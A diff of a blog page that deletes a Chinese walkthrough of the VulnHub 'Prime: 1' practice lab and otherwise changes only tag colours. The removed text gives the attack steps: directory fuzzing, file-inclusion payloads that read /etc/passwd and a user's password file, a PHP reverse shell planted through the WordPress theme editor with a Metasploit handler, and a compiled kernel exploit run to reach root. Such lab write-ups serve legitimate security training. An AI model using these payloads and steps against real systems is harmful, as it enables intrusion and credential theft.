@@ -218,63 +218,6 @@
         <div class="content" v-pre>
             
             <h3 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h3><p>Prime是vulnhub靶场环境的一个简单的利用靶场，我们可以在vulnhub的官网里搜索到它，Prime系列共有六个靶场，本次使用的是19年出的第一个靶场环境。</p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先用nmap对本机192.168.23.0网段探测存活主机并获取开放端口。</p>
-<p><img src="%7BB3341A69-D0E1-4DAC-B584-E661CCE4B868%7D.png" alt="{B3341A69-D0E1-4DAC-B584-E661CCE4B868}"></p>
-<p>找到了靶机，开放了两个端口：22和80. 22显然不能正面硬刚，所以从80端口下手。</p>
-<p>用dirb扫描一下。</p>
-<p><img src="image-20250319171800568.png" alt="image-20250319171800568"></p>
-<p>扫到了一个dev目录。还发现靶机运行着wordpress服务。</p>
-<p>先看dev</p>
-<p><img src="image-20250319171846884.png" alt="image-20250319171846884"></p>
-<p>用dirb继续扫描，这次加上-X扩展扫描。</p>
-<p><img src="image-20250319171939510.png" alt="image-20250319171939510"></p>
-<p>扫到了这三个内容，一个一个看。</p>
-<p><img src="image-20250319171947542.png" alt="image-20250319171947542"></p>
-<p><img src="image-20250319172017421.png" alt="image-20250319172017421"></p>
-<p>secret.txt给了一个hint，需要我们fuzz一个php，找到参数把location.txt传进去。</p>
-<p><code>wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.23.156/index.php\?FUZZ</code></p>
-<p><img src="image-20250319172218184.png" alt="image-20250319172218184"></p>
-<p>fuzz出了file这个参数，把location.txt传进去。</p>
-<p><img src="image-20250319172248813.png" alt="image-20250319172248813"></p>
-<p>给了一个secrettier360参数，联想到前面还有image.php，我们把这个secrettier360传给它，并赋值为&#x2F;etc&#x2F;passwd</p>
-<p><code>payload = http://192.168.23.156/image.php?secrettier360=/etc/passwd</code></p>
-<p><img src="image-20250319172437447.png" alt="image-20250319172437447"></p>
-<p>提示去&#x2F;home&#x2F;saket&#x2F;目录下找一个password.txt文件，依旧利用这个参数。</p>
-<p>payload &#x3D; <a target="_blank" rel="noopener" href="http://192.168.23.156/image.php?secrettier360=/home/saket/password.txt">http://192.168.23.156/image.php?secrettier360=/home/saket/password.txt</a></p>
-<p><img src="Prime-Series-Level-1%E9%9D%B6%E5%9C%BA-%E5%AE%9E%E6%88%98%5Cimage-20250319172611941.png" alt="image-20250319172611941"></p>
-<p>这个密码经测试，不是靶机中几个用户的密码。联想到靶机上运行着wordpress服务，猜测是wordpress上管理员账户的密码。</p>
-<p><img src="image-20250319172730587.png" alt="image-20250319172730587"></p>
-<p>只有一个用户，那就是他了。</p>
-<p>我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login%EF%BC%8C%E7%94%A8victor%E4%BD%9C%E4%B8%BA%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%89%8D%E9%9D%A2%E8%8E%B7%E5%8F%96%E7%9A%84follow_the_ippsec%E4%B8%BA%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95%EF%BC%8C%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95%E3%80%82">http://192.168.23.156/wordpress/wp-login，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</a></p>
-<h3 id="渗透提权"><a href="#渗透提权" class="headerlink" title="渗透提权"></a>渗透提权</h3><p>在Appearance下Theme Editor下找到了secret.php这个可修改文件，我们用msfvenom做个马挂上去。</p>
-<p><img src="image-20250319173013451.png" alt="image-20250319173013451"></p>
-<p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/%E8%BF%99%E4%B8%AA%E7%9B%AE%E5%BD%95%EF%BC%8C%E9%82%A3%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E4%BA%86%E3%80%82http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.23.156/wordpress/wp-content/themes/这个目录，那就是在这里了。http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php</a></p>
-<p>kali上，msfconsole提前准备好。</p>
-<pre><code>use exploit/multi/handler
-set LHOST 172.19.15.230
-set payload php/meterpreter/reverse_tcp
-run
-</code></pre>
-<p><img src="image-20250319173351806.png" alt="image-20250319173351806"></p>
-<p>成功连接。系统是ubuntu 16.04，我们需要找一个适用的exp。</p>
-<p><code>searchsploit 16.04 ubuntu</code></p>
-<p><code>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation         | linux/local/45010.c</code></p>
-<p><code>find /usr -name 45010.c</code></p>
-<p><code>/usr/share/exploitdb/exploits/linux/local/45010.c</code></p>
-<p>gcc编译一下，由于环境glibc版本过高，加上-static参数</p>
-<p><code>gcc /usr/share/exploitdb/exploits/linux/local/45010.c -o 45010 -static</code></p>
-<p>msfconsole那边，把exp upload上去。</p>
-<p><code>upload ~/45010 /tmp/45010</code></p>
-<p>然后开个shell</p>
-<pre><code class="bash">shell
-cd /tmp
-chmod +x 45010
-./45010
-whoami
-#root
-</code></pre>
-<p>提权成功。</p>
-
             
         </div>
     </div>
@@ -288,7 +231,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #00bcd4">Writeup</a>
         </span>
         
         <span class="tag">
@@ -343,7 +286,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ff7d73">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ffa2c4">笔记</a>
         </span>
         
     </div>
@@ -392,12 +335,12 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/AI/" style="color: #ffa2c4">AI</a>
+            <a href="/tags/AI/" style="color: #00bcd4">AI</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00bcd4">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ffa2c4">笔记</a>
         </span>
         
     </div>
@@ -445,7 +388,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #ffa2c4">杂项</a>
+            <a href="/tags/%E6%9D%82%E9%A1%B9/" style="color: #ff7d73">杂项</a>
         </span>
         
     </div>
@@ -496,7 +439,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #00a596">小说</a>
+            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #03a9f4">小说</a>
         </span>
         
     </div>
@@ -544,7 +487,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ff7d73">小说</a>
+            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #00bcd4">小说</a>
         </span>
         
     </div>
@@ -592,7 +535,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ffa2c4">小说</a>
+            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #ff7d73">小说</a>
         </span>
         
     </div>
@@ -640,7 +583,7 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #00bcd4">小说</a>
+            <a href="/tags/%E5%B0%8F%E8%AF%B4/" style="color: #00a596">小说</a>
         </span>
         
     </div>
@@ -688,12 +631,12 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #00bcd4">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Misc/" style="color: #03a9f4">Misc</a>
+            <a href="/tags/Misc/" style="color: #00bcd4">Misc</a>
         </span>
         
     </div>
@@ -741,12 +684,12 @@ whoami
         
         <span class="tag">
             
-            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #00bcd4">笔记</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ff7d73">笔记</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ffa2c4">服务器</a>
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00a596">服务器</a>
         </span>
         
     </div>
